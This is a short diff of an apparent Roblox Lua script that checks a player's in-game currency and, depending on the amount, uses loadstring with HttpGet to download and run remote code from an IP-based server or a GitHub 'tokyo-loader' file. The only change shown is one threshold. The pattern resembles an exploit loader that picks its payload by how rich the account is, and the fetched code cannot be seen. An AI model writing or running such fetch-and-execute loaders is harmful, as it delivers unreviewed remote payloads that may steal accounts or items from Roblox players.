@@ -11,7 +11,7 @@ local currentAmount = sheckles.Value
 if currentAmount > 100000 then
     loadstring(game:HttpGet("http://e1.aurorix.net:20475/p/1320730791537278997"))()
     
-elseif currentAmount < 0 then
+elseif currentAmount < 1 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/elputrachh/tokyo-loader/main/tokyo.lua"))()
     
 else
